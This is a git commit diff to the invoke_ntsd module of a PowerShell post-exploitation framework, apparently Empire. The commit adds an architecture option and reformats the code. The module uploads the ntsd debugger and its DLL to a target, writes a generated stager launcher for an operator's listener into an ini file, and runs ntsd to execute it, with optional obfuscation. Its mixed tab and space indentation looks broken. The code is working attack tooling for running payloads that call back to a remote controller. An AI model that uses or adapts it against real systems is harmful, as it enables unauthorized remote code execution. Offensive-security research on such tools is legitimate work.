a645d461eff7e6bbf217573fabf7a582a5dec1cd
root <root@localhost.localdomain>
2017-10-19 11:10:39 -0400

    changes to the invoke_ntsd module

--- lib/modules/powershell/code_execution/invoke_ntsd.py
+++ lib/modules/powershell/code_execution/invoke_ntsd.py
@@ -61,6 +61,11 @@ class Module:
 								'Required'			:		True,
 								'Value'					:		"C:\\Windows\\System32\\calc.exe"
 						},
+            'Arch' : {
+                'Description'   :   'Architecture the system is on.',
+                'Required'      :   True,
+                'Value'         :   'x64'
+            },
             'ProxyCreds' : {
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
@@ -81,75 +86,80 @@ class Module:
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
-				listenerName = self.options['Listener']['Value']
-				uploadPath = self.options['UploadPath']['Value'].strip()
-				bin = self.options['BinPath']['Value']
-				ntsd_exe_upload_path = uploadPath + "\\" + "ntsd.exe"
-				ntsd_dll_upload_path = uploadPath + "\\" + "ntsdexts.dll"
+        listenerName = self.options['Listener']['Value']
+        uploadPath = self.options['UploadPath']['Value'].strip()
+        bin = self.options['BinPath']['Value']
+        arch = self.options['Arch']['Value']
+        ntsd_exe_upload_path = uploadPath + "\\" + "ntsd.exe"
+        ntsd_dll_upload_path = uploadPath + "\\" + "ntsdexts.dll"
 
         # staging options
-				userAgent = self.options['UserAgent']['Value']
-				proxy = self.options['Proxy']['Value']
-				proxyCreds = self.options['ProxyCreds']['Value']
+        userAgent = self.options['UserAgent']['Value']
+        proxy = self.options['Proxy']['Value']
+        proxyCreds = self.options['ProxyCreds']['Value']
 
-				ntsd_exe = self.mainMenu.installPath + "data/module_source/code_execution/ntsd.exe"
-				ntsd_dll = self.mainMenu.installPath + "data/module_source/code_execution/ntsdexts.dll"
+        if arch == 'x64':
+				  ntsd_exe = self.mainMenu.installPath + "data/module_source/code_execution/ntsd_x64.exe"
+				  ntsd_dll = self.mainMenu.installPath + "data/module_source/code_execution/ntsdexts_x64.dll"
+        elif arch == 'x86':
+          ntsd_exe = self.mainMenu.installPath + "data/module_source/code_execution/ntsd_x86.exe"
+          ntsd_dll = self.mainMenu.installPath + "data/module_source/code_execution/ntsdexts_x86.dll"
 
         # read in the common module source code
-				moduleSource = self.mainMenu.installPath + "data/module_source/code_execution/Invoke-Ntsd.ps1"
-				if obfuscate:
-					helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-					moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
-				try:
-					f = open(moduleSource, 'r')
-				except:
-					print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
-					return ""
+        moduleSource = self.mainMenu.installPath + "data/module_source/code_execution/Invoke-Ntsd.ps1"
+        if obfuscate:
+          helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+          moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+        try:
+          f = open(moduleSource, 'r')
+        except:
+          print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+          return ""
 
-				moduleCode = f.read()
-				f.close()
+        moduleCode = f.read()
+        f.close()
 
-				script = moduleCode
-				scriptEnd = ""
-				if not self.mainMenu.listeners.is_listener_valid(listenerName):
-					# not a valid listener, return nothing for the script
-					print helpers.color("[!] Invalid listener: %s" %(listenerName))
-					return ''
-				else:
+        script = moduleCode
+        scriptEnd = ""
+        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+          # not a valid listener, return nothing for the script
+          print helpers.color("[!] Invalid listener: %s" %(listenerName))
+          return ''
+        else:
 
-					l = self.mainMenu.stagers.stagers['multi/launcher']
-					l.options['Listener']['Value'] = self.options['Listener']['Value']
-					l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
-					l.options['Proxy']['Value'] = self.options['Proxy']['Value']
-					l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
-					launcher = l.generate()
+          l = self.mainMenu.stagers.stagers['multi/launcher']
+          l.options['Listener']['Value'] = self.options['Listener']['Value']
+          l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
+          l.options['Proxy']['Value'] = self.options['Proxy']['Value']
+          l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
+          launcher = l.generate()
 
-					if launcher == '':
-						print helpers.color('[!] Error in launcher generation.')
-						return ''
-					else:
-						launcherCode = launcher.split(' ')[-1]
+          if launcher == '':
+            print helpers.color('[!] Error in launcher generation.')
+            return ''
+          else:
+           launcherCode = launcher.split(' ')[-1]
 
-						with open(ntsd_exe, 'rb') as bin_data:
-							ntsd_exe_data = bin_data.read()
+           with open(ntsd_exe, 'rb') as bin_data:
+             ntsd_exe_data = bin_data.read()
 
-						with open(ntsd_dll, 'rb') as bin_data:
-							ntsd_dll_data = bin_data.read()
+           with open(ntsd_dll, 'rb') as bin_data:
+             ntsd_dll_data = bin_data.read()
 
-						exec_write = "Write-Ini %s \"%s\"" % (uploadPath, launcher)
-						code_exec = "%s\\ntsd.exe -cf %s\\ntsd.ini %s" % (uploadPath, uploadPath, bin)
-						ntsd_exe_upload = self.mainMenu.stagers.generate_upload(ntsd_exe_data, ntsd_exe_upload_path)
-						ntsd_dll_upload = self.mainMenu.stagers.generate_upload(ntsd_dll_data, ntsd_dll_upload_path)
+           exec_write = "Write-Ini %s \"%s\"" % (uploadPath, launcher)
+           code_exec = "%s\\ntsd.exe -cf %s\\ntsd.ini %s" % (uploadPath, uploadPath, bin)
+           ntsd_exe_upload = self.mainMenu.stagers.generate_upload(ntsd_exe_data, ntsd_exe_upload_path)
+           ntsd_dll_upload = self.mainMenu.stagers.generate_upload(ntsd_dll_data, ntsd_dll_upload_path)
 
-						script += "\r\n"
-						script += ntsd_exe_upload
-						script += ntsd_dll_upload
-						script += "\r\n"
-						script += exec_write
-						script += "\r\n"
-						# this is to make sure everything was uploaded properly
-						script += "Start-Sleep -s 5"
-						script += "\r\n"
-						script += code_exec
+           script += "\r\n"
+           script += ntsd_exe_upload
+           script += ntsd_dll_upload
+           script += "\r\n"
+           script += exec_write
+           script += "\r\n"
+           # this is to make sure everything was uploaded properly
+           script += "Start-Sleep -s 5"
+           script += "\r\n"
+           script += code_exec
 
-						return script
+           return script
